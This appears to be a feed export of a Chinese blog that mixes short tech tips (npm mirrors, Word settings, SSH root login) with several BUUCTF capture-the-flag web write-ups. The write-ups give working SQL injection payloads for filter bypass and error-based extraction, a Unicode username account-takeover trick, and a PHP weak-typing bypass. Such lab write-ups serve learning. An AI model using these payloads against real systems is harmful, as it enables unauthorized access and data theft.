   user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这几个模块中都调用了<code>nodeprep.prepare</code>这个函数</p><p>查阅资料</p><p><code>nodeprep.prepare</code>这个函数会把大写转换为小写 并且会做如下转换<br>假如有一个<code>ᴬ</code>字符 第一次调用函数时会造成<code>ᴬ-&gt;A</code>，第二次调用时会<code>A-&gt;a</code><br>所以思路就是 我们注册一个<code>ᴬdmin</code>账号 此时第一次调用<code>nodeprep.prepare</code> 账号变为<br><code>Admin</code>,在修改密码，会再次调用<code>nodeprep.prepare</code>,这是就变成了<code>admin</code></p><p>再用改的密码登录admin就成功了</p><p><img src="https://images.dadream.eu.org/images/2024/07/61f32fe1637fae1ee2a8518376ec863f.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/0b7140acc16e55a440c1a3cca110b993.png"><img src="https://z3.ax1x.com/2021/03/29/c9ERk4.png" alt="c9ERk4.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/0d71cb0dbfc9d7ce0c338760b7caa735.png"></p><p><img src="https://images.dadream.eu.org/images/2024/07/78d77b713bfeff7b558f66944ef1991e.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>word关闭首字母自动大写</title>
      <link href="/2021/03/24/word-guan-bi-shou-zi-mu-zi-dong-da-xie/"/>
      <url>/2021/03/24/word-guan-bi-shou-zi-mu-zi-dong-da-xie/</url>
      
        <content type="html"><![CDATA[<p>点击文件<img src="https://images.dadream.eu.org/images/2024/07/7ff4c1944e88621d37d852cb87ca3f1b.png">点击选项</p><p><img src="https://images.dadream.eu.org/images/2024/07/6dbb2a517e88f9d3d243aaf30842c283.png"></p><p>点击校对</p><p><img src="https://images.dadream.eu.org/images/2024/07/755f366f0a66f115a17735cf8572eb15.png"></p><p>点击自动更正选项</p><p><img src="https://images.dadream.eu.org/images/2024/07/103a1ccac07822449c88a114c3699b7f.png"></p><p>欧拉</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm换源</title>
      <link href="/2021/03/22/npm-huan-yuan/"/>
      <url>/2021/03/22/npm-huan-yuan/</url>
      
        <content type="html"><![CDATA[<h1 id="npm换源"><a href="#npm换源" class="headerlink" title="npm换源"></a>npm换源</h1><p>临时源</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在安装时候临时指定<span class="token function">npm</span> <span class="token parameter variable">--registry</span> http://registry.cnpmjs.org install/info express<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>持久源</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npmmirror.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>永久修改镜像源</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看 npm 配置</span>$ <span class="token function">npm</span> config list<span class="token comment"># 其他查看配置的方式</span>$ <span class="token function">npm</span> config get globalconfig$ <span class="token function">npm</span> config <span class="token function">ls</span> <span class="token parameter variable">-l</span>找到并打开配置文件：~/.npmrc写入配置：registry<span class="token operator">=</span>https://registry.npmmirror.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>验证设置是否成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config get registry<span class="token comment"># OR</span><span class="token function">npm</span> info express<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="原始源"><a href="#原始源" class="headerlink" title="原始源"></a>原始源</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npmjs.org/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="淘宝源"><a href="#淘宝源" class="headerlink" title="淘宝源"></a>淘宝源</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npmmirror.com/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="华为源"><a href="#华为源" class="headerlink" title="华为源"></a>华为源</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://mirrors.huaweicloud.com/repository/npm/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="通过使用淘宝定制的cnpm安装"><a href="#通过使用淘宝定制的cnpm安装" class="headerlink" title="通过使用淘宝定制的cnpm安装"></a>通过使用淘宝定制的cnpm安装</h2><ol><li>安装cnpm</li></ol><p>npm install -g cnpm –registry=<a href="https://registry.npmmirror.com/">https://registry.npmmirror.com</a></p><ol start="2"><li>使用cnpm</li></ol><p>cnpm install xxx</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh拒绝连接</title>
      <link href="/2021/03/21/ssh-ju-jue-lian-jie/"/>
      <url>/2021/03/21/ssh-ju-jue-lian-jie/</url>
      
        <content type="html"><![CDATA[<ol><li>sudo vi /etc/ssh/sshd_config  将PermitRootLogin修改为yes</li><li>sudo /etc/init.d/ssh restart重启动了sshd服务</li></ol>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 HardSQL</title>
      <link href="/2021/03/17/ji-ke-da-tiao-zhan-2019-hardsql/"/>
      <url>/2021/03/17/ji-ke-da-tiao-zhan-2019-hardsql/</url>
      
        <content type="html"><![CDATA[<p>打开页面，还是注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>万能密码不行，并且一直是相同的返回信息，被过滤了就会显示这个</p><p><img src="https://images.dadream.eu.org/images/2024/07/c717a388a2c047cdc8fe689ae6563e70.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin'<span class="token operator">&amp;</span>password<span class="token operator">=</span>password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://images.dadream.eu.org/images/2024/07/b0f8125ffd379233b710c42385b18ca7.png"></p><p>报错可以报错注入</p><p>构造payload,这里还过滤了空格(括号绕过)</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))%23&amp;password=1or?username=admin'</span><span class="token operator">or</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>XPATH syntax error: <span class="token string">'~geek~'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>H4rDsq1<span class="token operator">~</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class="token string">')),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token operator">~</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>flag{ee2d297b<span class="token operator">-</span>ca3d<span class="token operator">-</span><span class="token number">4</span>d9e<span class="token operator">-</span><span class="token number">9</span>c8a<span class="token operator">-</span>d2'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>flag没全部输出，大笑.gif</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>b<span class="token operator">-</span>ca3d<span class="token operator">-</span><span class="token number">4</span>d9e<span class="token operator">-</span><span class="token number">9</span>c8a<span class="token operator">-</span>d23113610a22}<span class="token operator">~</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020_新生赛 BackupFile</title>
      <link href="/2021/03/09/actf2020-xin-sheng-sai-backupfile/"/>
      <url>/2021/03/09/actf2020-xin-sheng-sai-backupfile/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>扫描目录，下载index.php.bak(这就是备份文件)<img src="https://images.dadream.eu.org/images/2024/07/eb4ca6d67bc1757f92fcbc135fe55664.png"><code>index.php.bak</code>代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码审计</p><p>$key不为数字，且等于$str,显示flag</p><p>这里涉及到php的弱类型，123==”123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”</p><p>传入参数得到flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload：<span class="token operator">?</span>key<span class="token operator">=</span><span class="token number">123</span><span class="token operator">&amp;</span>str<span class="token operator">=</span><span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 BabySQL</title>
      <link href="/2021/03/09/ji-ke-da-tiao-zhan-2019-babysql/"/>
      <url>/2021/03/09/ji-ke-da-tiao-zhan-2019-babysql/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>有登录的一般都会想到万能密码，过滤了大不了绕过吧，和前面没多大区别</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>未能成功，双写绕过<code>or</code>试试</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' oorr '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里确实存在注入点，成功了，开始注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2  %23&amp;password=password报错，双写union selectcheck.php?username='</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>passwordThe used <span class="token keyword">SELECT</span> statements have a different number <span class="token keyword">of</span> <span class="token keyword">columns</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' ororderder by 3 %23&amp;password=2order被pass了，直接挨着猜check.php?username='</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>  <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span><span class="token number">3</span>列，哈哈<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' ununionion selselectect 1,version(),database()  %23&amp;password=2//Hello 10.3.18-MariaDB！//Your password is '</span>geek'<span class="token comment">//得到数据库版本和当前数据库名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>爆所有数据库名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' ununionion selselectect 1,2,group_concat(schema_name) frofromm infoorrmation_schema.schemata  %23&amp;password=2Hello 2！Your password is '</span>information_schema<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>test<span class="token punctuation">,</span>ctf<span class="token punctuation">,</span>geek'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>ctf</code>可疑，爆表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span>whwhereere table_schema<span class="token operator">=</span><span class="token string">'ctf'</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'Flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>爆列名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>whwhereere table_name<span class="token operator">=</span><span class="token string">'Flag'</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>爆数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span> ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>frfromom<span class="token punctuation">(</span>ctf<span class="token punctuation">.</span>Flag<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span> Hello <span class="token number">2</span>！Your password <span class="token operator">is</span> <span class="token string">'flag{cc46361f-7094-4e08-a744-2c4c3fcc9eb0}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019 PHP</title>
      <link href="/2021/03/08/ji-ke-da-tiao-zhan-2019-php/"/>
      <url>/2021/03/08/ji-ke-da-tiao-zhan-2019-php/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>页面提示<code>我有一个良好的备份网站的习惯</code></p><p>找一个备份的字典扫扫网站目录</p><p><img src="https://images.dadream.eu.org/images/2024/07/e8029df5cc6e494b73e6bd6bdbb24d06.png"></p><p>下载这个压缩包<code>www.zip</code></p><p>有几个文件</p><p>class.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token 